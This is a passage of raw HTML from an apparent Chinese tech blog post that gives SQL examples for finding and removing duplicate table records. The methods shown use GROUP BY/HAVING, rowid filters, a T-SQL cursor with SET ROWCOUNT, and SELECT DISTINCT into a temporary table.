src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img 